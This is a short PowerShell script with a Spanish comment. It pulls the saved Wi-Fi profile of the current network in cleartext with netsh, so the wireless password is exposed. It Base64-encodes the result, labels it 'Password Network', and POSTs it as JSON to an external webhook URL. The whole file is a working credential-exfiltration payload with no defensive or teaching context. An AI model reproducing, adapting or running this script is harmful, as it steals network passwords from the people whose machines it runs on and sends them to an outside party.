$Command = netsh wlan show profile name=(Get-NetConnectionProfile).Name key=clear
$Base64 = [Convert]::ToBase64String(
    [System.Text.Encoding]::UTF8.GetBytes($Command)
)

$Body = @{
    name = "Password Network"
    content = $Base64
} | ConvertTo-Json

# Enviar al webhook
$Response = Invoke-RestMethod `
    -Uri https://hkdk.events/q0071x2qb5gqs1 `
    -Method POST `
    -ContentType "application/json" `
    -Body $Body
